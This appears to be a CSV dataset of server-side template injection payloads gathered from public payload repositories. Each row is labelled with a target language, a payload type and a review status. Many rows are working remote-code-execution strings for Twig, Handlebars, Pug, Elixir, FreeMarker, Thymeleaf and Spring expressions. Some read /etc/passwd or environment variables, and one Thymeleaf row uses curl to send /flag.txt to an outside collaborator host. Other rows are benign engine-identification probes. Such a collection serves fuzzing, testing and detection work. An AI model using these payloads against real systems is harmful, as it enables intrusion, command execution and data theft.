"{{ 1 / ([""id >>/dev/null && echo -n 1"", ""0""]|sort(""system"")|first == ""0"") }} // Boolean-Based RCE with sandbox bypass using CVE-2022-23614","{{N/([""S"",""S""]|sort(""S"")|first==""S"")}}//boolean-basedrcewithsandboxbypassusingcve-N-N",php,unknown,1,low,probe,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
{{ {'id':'shell_exec'}|map('call_user_func')|join }},{{{'S':'S'}|map('S')|join}},php,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }},filename{%setvar=dump(_context)[offset:length]%}{{include(var)}},php,unknown,1,low,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"email=""{{app.request.query.filter(0,0,1024,{'options':'system'})}}""@attacker.tld","email=""S""@attacker.tld",php,unknown,1,low,enumeration,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}},{%blocku%}idNpassthru{%endblock%}{%setx=block(_charset|first)|split(N)%}{{[x|first]|map(x|last)|join}},php,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}","{{id~passthru~_context|join|slice(N,N)|split(N)|map(_context|join|slice(N,N))}}",php,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"{var $X=""POC""}{$X}","{var$x=""S""}{$x}",php,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
{php system('nslookup oastify.com')},{phpsystem('S')},php,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
Hello {NAME}.<br/>,hello{name}.<br/>,php,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
<head><title>{PAGE_TITLE}</title></head>,<head><title>{page_title}</title></head>,php,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"<tr><td colspan=""2"">{NUM_AUTHORS}</td></tr>","<tr><tdcolspan=""S"">{num_authors}</td></tr>",php,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>,<tr><td>{author_name}</td><td>{author_email}</td></tr>,php,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/PHP.md
"[""""][0 + !(global.process.mainModule.require(""child_process"").spawnSync(""id"", options={shell:true}).status===0)][""length""]","[""S""][N+!(global.process.mainmodule.require(""S"").spawnsync(""S"",options={shell:true}).status===N)][""S""]",javascript,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
{{this}},{{this}},javascript,unknown,1,low,uncertain,yes,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
"{{#with ""s"" as |string|}}","{{#with""S""as|string|}}",javascript,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
"{{#with ""e""}}","{{#with""S""}}",javascript,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
{{#with split as |conslist|}},{{#withsplitas|conslist|}},javascript,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
{{this.pop}},{{this.pop}},javascript,unknown,1,low,uncertain,yes,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
"{{this.push (lookup string.sub ""constructor"")}}","{{this.push(lookupstring.sub""S"")}}",javascript,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
{{#with string.split as |codelist|}},{{#withstring.splitas|codelist|}},javascript,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
"{{this.push ""return require('child_process').execSync('ls -la');""}}","{{this.push""S""}}",javascript,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
{{#each conslist}},{{#eachconslist}},javascript,unknown,1,low,uncertain,yes,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
{{#with (string.sub.apply 0 codelist)}},{{#with(string.sub.applyNcodelist)}},javascript,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
{{/with}},{{/with}},javascript,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
{{/each}},{{/each}},javascript,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
"string = ""{{= username}}""","string=""S""",javascript,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
{{= _.VERSION}},{{=_.version}},javascript,unknown,1,low,uncertain,yes,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
${= _.VERSION},${=_.version},javascript,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
<%= _.VERSION %>,<%=_.version%>,javascript,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
{{= _.templateSettings.evaluate }},{{=_.templatesettings.evaluate}},javascript,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
"{{x=Object}}{{w=a=new x}}{{w.type=""pipe""}}{{w.readable=1}}{{w.writable=1}}{{a.file=""/bin/sh""}}{{a.args=[""/bin/sh"",""-c"",""id;ls""]}}{{a.stdio=[w,w]}}{{process.binding(""spawn_sync"").spawn(a).output}}","{{x=object}}{{w=a=newx}}{{w.type=""S""}}{{w.readable=N}}{{w.writable=N}}{{a.file=""S""}}{{a.args=[""S"",""S"",""S""]}}{{a.stdio=[w,w]}}{{process.binding(""S"").spawn(a).output}}",javascript,unknown,1,low,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
"#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}","#{root.process.mainmodule.require('S').spawnsync('S',['S']).stdout}",javascript,unknown,1,low,direct-execution,no,,https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/JavaScript.md
"<%= File.read!(""/etc/passwd"") %>","<%=file.read!(""S"")%>",elixir,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Elixir.md
"<%= elem(System.shell(""id""), 0) %> # Rendered RCE","<%=elem(system.shell(""S""),N)%>#renderedrce",elixir,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Elixir.md
"<%= [1, 2][elem(System.shell(""id""), 0)] %> # Error-Based RCE","<%=[N,N][elem(system.shell(""S""),N)]%>#error-basedrce",elixir,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Elixir.md
"<%= 1/((elem(System.shell(""id""), 1) == 0)&&1||0) %> # Boolean-Based RCE","<%=N/((elem(system.shell(""S""),N)==N)&&N||N)%>#boolean-basedrce",elixir,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Elixir.md
"<%= elem(System.shell(""id && sleep 5""), 0) %> # Time-Based RCE","<%=elem(system.shell(""S""),N)%>#time-basedrce",elixir,unknown,1,low,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Server%20Side%20Template%20Injection/Elixir.md
{{42*42}},{{N*N}},unknown,unknown,1,low,probe,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-expression.txt
{{{42*42}}},{{{N*N}}},unknown,unknown,1,low,probe,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-expression.txt
${42*42},${N*N},java,unknown,1,low,probe,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-expression.txt
<%=42*42 %>,<%=N*N%>,ruby,unknown,1,low,probe,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-expression.txt
{{=42*42}},{{=N*N}},unknown,unknown,1,low,probe,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-expression.txt
${donotexists|42*42},${donotexists|N*N},java,unknown,1,low,probe,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-expression.txt
[[${42*42}]],[[${N*N}]],java,unknown,1,low,probe,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-expression.txt
"D{{=""O""}}T","d{{=""S""}}t",unknown,unknown,1,low,uncertain,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
P#{XXXXX}ug,p#{xxxxx}ug,ruby,unknown,1,low,uncertain,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
Thym[[${session}]]eleaf,thym[[${session}]]eleaf,java,unknown,1,low,uncertain,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
Dus{XXXXXXX}tjs,dus{xxxxxxx}tjs,unknown,unknown,1,low,uncertain,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
"La{var $X=""tt""}{$X}e","la{var$x=""S""}{$x}e",unknown,unknown,1,low,uncertain,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
"Underscore OR<%""XXXXXXXXXX""%>Ejs","underscoreor<%""S""%>ejs",ruby,unknown,1,low,uncertain,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
"E<%=""j""_%>s","e<%=""S""_%>s",ruby,unknown,1,low,uncertain,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
"This{{printf ""is ""}}GO","this{{printf""S""}}go",unknown,unknown,1,low,uncertain,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
"Haml#{""OR""}Slim","haml#{""S""}slim",ruby,unknown,1,low,uncertain,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
"Erb<%=""OR Erubi OR""%>Erubis","erb<%=""S""%>erubis",ruby,unknown,1,low,uncertain,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
Must{{Context.lookup}}ache,must{{context.lookup}}ache,unknown,unknown,1,low,uncertain,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
Handlebars OR Hogan{{XXXXXXX}} OR Pystache,handlebarsorhogan{{xxxxxxx}}orpystache,unknown,unknown,1,low,uncertain,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
{{#if 0 IncludeZero=true}}Handlebars{{/if}},{{#ifNincludezero=true}}handlebars{{/if}},unknown,unknown,1,low,uncertain,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
"Mako${""OR Chameleon OR ""}Cheetah","mako${""S""}cheetah",java,unknown,1,low,uncertain,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
"Freemakers${"" OR ""}Groovy","freemakers${""S""}groovy",java,unknown,1,low,uncertain,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
"Liquid AND Blade OR Twig {{"" AND Jinja2 OR Bottle OR Tornado OR Django AND ""}}Nunjucks OR Twig OR Vue","liquidandbladeortwig{{""S""}}nunjucksortwigorvue",unknown,unknown,1,low,uncertain,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
{{|reverse}},{{|reverse}},unknown,unknown,1,low,uncertain,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
{{|wordcount}},{{|wordcount}},unknown,unknown,1,low,uncertain,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
{{-Comment-}},{{-comment-}},unknown,unknown,1,low,uncertain,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
"{{ ""<h1>Django OR Jinja</h1>""|striptags }}","{{""S""|striptags}}",unknown,unknown,1,low,uncertain,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
Djan{{ Jinja2.Django }}go,djan{{jinjaN.django}}go,unknown,unknown,1,low,uncertain,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
Torn{% comment %}ado,torn{%comment%}ado,unknown,unknown,1,low,uncertain,no,,https://github.com/danielmiessler/SecLists/blob/d9458f277ed978a608ad165e5eb2fdb389e4c7ee/Fuzzing/template-engines-identification.txt
http://vulnerable-website.com/?name={{bad-stuff-here}},http://vulnerable-website.com/?name={{bad-stuff-here}},python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"~s|#{name}=""#{val}""|","~s|#{name}=""S""|",ruby,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"${class.getResource("""").getPath()}","${class.getresource(""S"").getpath()}",java,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"// if ${...} doesn't work try #{...}, *{...}, @{...} or ~{...}.","//if${...}doesn'tworktry#{...},*{...},@{...}or~{...}.",java,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
${T(java.lang.System).getenv()},${t(java.lang.system).getenv()},java,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},${t(java.lang.runtime).getruntime().exec('S')},java,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}","<#assignex=""S""?new()>${ex(""S"")}",java,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},[#assignex='S'?new()]${ex('S')},java,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"${""freemarker.template.utility.Execute""?new()(""id"")}","${""S""?new()(""S"")}",java,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join("" "")}","${product.getclass().getprotectiondomain().getcodesource().getlocation().touri().resolve('S').tourl().openstream().readallbytes()?join(""S"")}",java,unknown,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"${#rt = @java.lang.Runtime@getRuntime(),#rt.exec(""calc"")}","${#rt=@java.lang.runtime@getruntime(),#rt.exec(""S"")}",java,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
#{selection.__${sel.code}__},#{selection.__${sel.code}__},java,unknown,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"<a th:href=""@{__${path}__}"" th:title=""${title}"">","<ath:href=""S""th:title=""S"">",java,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"<a th:href=""${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}"" th:title='pepito'>","<ath:href=""S""th:title='S'>",java,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')}),http://localhost:N/(${t(java.lang.runtime).getruntime().exec('S')}),java,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())},*{t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().exec('S').getinputstream())},unknown,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(""id"").getInputStream()).next()}__::.x","__${newjava.util.scanner(t(java.lang.runtime).getruntime().exec(""S"").getinputstream()).next()}__::.x",java,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"__${T(java.lang.Runtime).getRuntime().exec(""touch executed"")}__::.x","__${t(java.lang.runtime).getruntime().exec(""S"")}__::.x",java,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }},{{variable.getclass().forname('S').getruntime().exec('S')}},python,unknown,1,low,direct-execution,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{% raw %},{%raw%},python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{% endraw %},{%endraw%},python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{request.isDebug()}},{{request.isdebug()}},python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{'a'.getClass().forName('sun.misc.Launcher').newInstance()}},{{'S'.getclass().forname('S').newinstance()}},python,unknown,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}},{{'S'.getclass().forname('S').newinstance()}},python,unknown,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{% %} and {{ }} blocks,{%%}and{{}}blocks,python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %},{%setji='S'.getclass().forname('S').newinstance().newinterpreter()%},python,unknown,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
{{ji.render('{{1*2}}')}},{{ji.render('S')}},python,unknown,1,low,uncertain,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
"//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}","//{{'S'.getclass().forname('S').newinstance().getenginebyname('S').eval(\""S"")}}",python,unknown,1,low,introspection,no,manual_review_pending (wiki/template extraction 2026-09-19),https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/README.md
